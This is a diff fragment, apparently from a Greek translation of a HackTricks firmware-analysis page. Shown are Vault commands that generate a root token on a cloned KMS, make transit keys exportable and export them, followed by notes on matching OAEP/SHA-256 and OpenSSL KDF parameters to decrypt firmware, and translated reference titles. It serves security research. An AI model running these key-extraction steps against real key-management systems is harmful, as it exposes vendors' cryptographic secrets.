+FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
+TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
+```
+Με root στο cloned KMS:
+
+- Κάντε τα transit keys exportable μόνο μέσα στο isolated clone: `vault write transit/keys/<name>/config exportable=true`
+- Εξαγάγετε το unwrap key: `vault read transit/export/encryption-key/<name>`
+- Δοκιμάστε το ανακτημένο RSA key με το ακριβές ζεύγος padding/hash που χρησιμοποιεί το KMS. Μια αποτυχημένη αποκρυπτογράφηση PKCS#1 v1.5 και μια αποτυχημένη προεπιλεγμένη αποκρυπτογράφηση OAEP **δεν** αποδεικνύουν ότι το key είναι λάθος· πολλά Vault-backed flows χρησιμοποιούν OAEP με SHA-256, ενώ οι κοινές libraries έχουν ως προεπιλογή το SHA-1.
+- Αν το payload ξεκινά με `Salted__`, αναπαραγάγετε ακριβώς το OpenSSL KDF του vendor (`EVP_BytesToKey`, συχνά MD5 σε legacy appliances) πριν επιχειρήσετε αποκρυπτογράφηση AES-CBC.
+
+Αυτό μετατρέπει το "encrypted firmware" σε ένα πιο γενικό πρόβλημα: **ανακτήστε τα operational keys στην πλευρά του appliance και, στη συνέχεια, αναπαραγάγετε offline τις ακριβείς παραμέτρους unwrap + KDF**.
+
+## Εκπαίδευση και Πιστοποίηση
 
 - [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)
 
-## References
+## Αναφορές
 
+- [Cracking Firmware με Claude: Skill επιπέδου Senior, Autonomy επιπέδου Junior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
 - [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
-- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
-- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
-- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
-- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
-- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
-- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
+- [Practical IoT Hacking: Ο απόλυτος οδηγός για την επίθεση στο Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
+- [Εκμετάλλευση zero days σε εγκαταλελειμμένο hardware – blog των Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [Πώς μια Smart Device αξίας $20 μου έδωσε πρόσβαση στο σπίτι σας](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
+- [Τώρα το βλέπετε: Τώρα είστε Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
+- [Synacktiv - Εκμετάλλευση του Tesla Wall Connector από τον connector της θύρας φόρτισης - Part 2: παράκαμψη του anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
+- [Make it Blink: Over-the-Air Exploitation του Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
 
 {{#include ../../banners/hacktricks-training.md}}
